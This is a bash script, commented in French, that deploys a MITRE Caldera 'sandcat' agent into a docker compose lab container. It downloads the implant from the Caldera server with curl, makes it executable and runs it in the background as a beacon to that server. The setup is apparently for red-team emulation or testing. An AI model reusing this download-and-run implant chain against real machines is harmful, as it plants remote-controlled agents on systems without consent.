#!/usr/bin/env bash
set -euo pipefail

COMPOSE_BIN="docker compose"
CURL_SERVICE="curl"
CALDERA_URL="http://caldera:8888"
IMPLANT_NAME="caldera-agt"
GROUP="red"
PLATFORM="linux"

echo "[+] Déploiement de l'agent Caldera dans le conteneur: $CURL_SERVICE"
echo "[+] Serveur Caldera: $CALDERA_URL"

echo "[+] Vérification de l'accès à Caldera depuis le conteneur..."
$COMPOSE_BIN exec -T "$CURL_SERVICE" curl -fsS "$CALDERA_URL" >/dev/null

echo "[+] Téléchargement de l'agent..."
$COMPOSE_BIN exec -T "$CURL_SERVICE" sh -c "
  rm -f $IMPLANT_NAME &&
  curl -s -X POST \
    -H 'file:sandcat.go' \
    -H 'platform:$PLATFORM' \
    '$CALDERA_URL/file/download' > $IMPLANT_NAME &&
  chmod +x $IMPLANT_NAME
"

echo "[+] Lancement de l'agent en arrière-plan..."
$COMPOSE_BIN exec -T "$CURL_SERVICE" sh -c "
  nohup ./$IMPLANT_NAME -server '$CALDERA_URL' -group '$GROUP' >/tmp/${IMPLANT_NAME}.log 2>&1 &
"

sleep 3

echo "[+] Vérification du process dans le conteneur..."
$COMPOSE_BIN exec -T "$CURL_SERVICE" sh -c "ps aux | grep $IMPLANT_NAME | grep -v grep || true"

echo
echo "[OK] Agent Caldera déployé."
echo "[i] Vérifie maintenant dans l'interface Caldera > Agents qu'il apparaît en 'alive, trusted'."
